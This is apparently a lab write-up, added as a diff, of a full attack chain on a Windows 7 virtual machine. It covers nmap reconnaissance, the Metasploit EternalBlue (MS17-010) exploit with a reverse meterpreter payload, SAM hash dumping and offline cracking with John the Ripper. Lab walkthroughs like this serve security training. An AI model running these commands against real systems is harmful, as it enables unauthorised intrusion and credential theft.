@@ -1,0 +1,176 @@
+==================================================
+Windows 7 EternalBlue + Credential Dumping
+==================================================
+
+Target:
+Windows 7 SP1
+IP: 192.168.56.104
+
+Attacker:
+Kali Linux
+IP: 192.168.56.1
+
+
+==================================================
+Reconnaissance
+==================================================
+
+1. Host Discovery
+
+Command:
+nmap -sn 192.168.56.0/24
+
+Result:
+192.168.56.104 is alive
+
+
+--------------------------------------------------
+
+2. Service Enumeration
+
+Command:
+nmap -p 445 -sV 192.168.56.104
+
+Result:
+445/tcp open  microsoft-ds (SMB)
+
+
+--------------------------------------------------
+
+3. Vulnerability Check (MS17-010)
+
+Command:
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.56.104
+run
+
+Result:
+Target is VULNERABLE to MS17-010
+
+
+==================================================
+Exploitation
+==================================================
+
+1. EternalBlue Exploit
+
+Module:
+exploit/windows/smb/ms17_010_eternalblue
+
+Steps:
+
+msfconsole
+
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.104
+set LHOST 192.168.56.1
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+run
+
+
+--------------------------------------------------
+
+2. Verification
+
+Commands:
+
+getuid
+sysinfo
+
+Result:
+
+NT AUTHORITY\SYSTEM
+Full SYSTEM-level access obtained.
+
+
+==================================================
+Post-Exploitation
+==================================================
+
+1. Credential Dumping
+
+Command:
+
+hashdump
+
+Result:
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+windows7:1000:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+
+
+--------------------------------------------------
+
+2. Hash Analysis
+
+- LM hash is disabled (aad3b435b51404eeaad3b435b51404ee)
+- NTLM hash contains the actual password
+
+Important finding:
+
+31d6cfe0d16ae931b73c59d7e0c089c0
+→ Empty password (Administrator account)
+
+
+--------------------------------------------------
+
+3. Password Cracking
+
+Preparation:
+
+Create file:
+hashes.txt
+
+Format:
+
+Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
+windows7:8846f7eaee8fb117ad06bdd830b7586c
+
+
+Command:
+
+john hashes.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+Result:
+
+windows7:<password recovered>
+
+
+Command to display results:
+
+john --show hashes.txt
+
+
+John the Ripper Behavior:
+
+- Stores cracked hashes in ~/.john/john.pot
+- Will not re-crack known hashes
+- Use john --show to display results
+- Delete pot file to reset cracking
+
+==================================================
+Summary
+==================================================
+
+- Target was vulnerable to MS17-010 (EternalBlue)
+- Exploitation resulted in SYSTEM-level access
+- Password hashes were extracted from the SAM database
+- Administrator account had an empty password
+- User credentials were successfully cracked offline
+
+This demonstrates a full attack chain:
+
+Reconnaissance → Exploitation → Privilege Access → Credential Dumping → Password Cracking
+
+
+==================================================
+Key Learning Points
+==================================================
+
+- Unpatched systems are highly vulnerable to remote exploits
+- SYSTEM access allows extraction of sensitive credential data
+- Password hashes can be cracked offline without interacting with the target
+- Weak or empty passwords significantly increase risk
+- Post-exploitation is critical for full compromise, not just initial access
